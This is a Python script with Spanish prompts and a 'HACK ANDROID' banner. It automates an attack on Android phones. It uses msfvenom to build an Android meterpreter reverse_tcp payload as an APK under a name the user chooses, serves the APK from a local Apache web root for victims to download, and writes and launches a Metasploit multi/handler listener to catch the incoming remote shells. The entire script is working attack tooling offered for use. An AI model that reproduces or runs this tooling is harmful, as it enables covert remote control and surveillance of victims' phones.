#!/usr/bin/python
#-*- coding: utf-8 -*-
#Aureliohacking


import os
import time

os.system("clear")

ruta = os.getcwd() + "/comandos/"

def payload(HOST,PORT,APP):

    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ HOST + " LPORT=" + PORT + " R > " + ruta + APP + ".apk")
    print("El payload esta dentro de la carpeta comandos")
    time.sleep(2)
    os.system("cp " + ruta + APP + ".apk " + "/var/www/html")
    print("activando el multi/handler")
    time.sleep(2)
    os.system("service apache2 start")
    time.sleep(2)
    print("*******************************************")
    print(" Iniciando el modo escucha")
    time.sleep(2)

    opcion = 'S';

    if opcion == 'S':
    	file = open(ruta + "metasploit.rc", "w")
    	file.write("use exploit/multi/handler" + os.linesep)
    	file.write("set payload android/meterpreter/reverse_tcp" + os.linesep)
    	file.write("set LHOST "+ HOST + os.linesep)
    	file.write("set LPORT "+ PORT + os.linesep)
    	file.write("exploit")
    	file.close()
    	os.system('clear')
    	print("Iniciando el ataque....")
    	os.system("msfconsole -r" + ruta + "metasploit.rc")
    else:
    	os.system("clear") 


def menu():

    print('''
'##::::'##::::'###:::::'######::'##:::'##:::::::'###::::'##::: ##:'########::'########:::'#######::'####:'########::
 ##:::: ##:::'## ##:::'##... ##: ##::'##:::::::'## ##::: ###:: ##: ##.... ##: ##.... ##:'##.... ##:. ##:: ##.... ##:
 ##:::: ##::'##:. ##:: ##:::..:: ##:'##:::::::'##:. ##:: ####: ##: ##:::: ##: ##:::: ##: ##:::: ##:: ##:: ##:::: ##:
 #########:'##:::. ##: ##::::::: #####:::::::'##:::. ##: ## ## ##: ##:::: ##: ########:: ##:::: ##:: ##:: ##:::: ##:
 ##.... ##: #########: ##::::::: ##. ##:::::: #########: ##. ####: ##:::: ##: ##.. ##::: ##:::: ##:: ##:: ##:::: ##:
 ##:::: ##: ##.... ##: ##::: ##: ##:. ##::::: ##.... ##: ##:. ###: ##:::: ##: ##::. ##:: ##:::: ##:: ##:: ##:::: ##:
 ##:::: ##: ##:::: ##:. ######:: ##::. ##:::: ##:::: ##: ##::. ##: ########:: ##:::. ##:. #######::'####: ########::
..:::::..::..:::::..:::......:::..::::..:::::..:::::..::..::::..::........:::..:::::..:::.......:::....::........:::

                                                    UNIGUAJIRA, @  ''')
    print("Selecciones una opcion")
  
    print("\t 1) Crear un Payload para Android")
    print("\t 0) Salir")



while True:




    menu()

    opcionMenu = input("Opcion: ")

   
    if opcionMenu == '1':

    	HOST = input( "agregar lhost: ")
    	PORT = input("agregar lport:  ")
    	APP = input("nombre de la apk: ")
    	payload(HOST,PORT,APP)


    if opcionMenu == '0':

    	salir ='S';

    	if salir == 'S':

    		exit()
    	else:
    		os.system("clear")
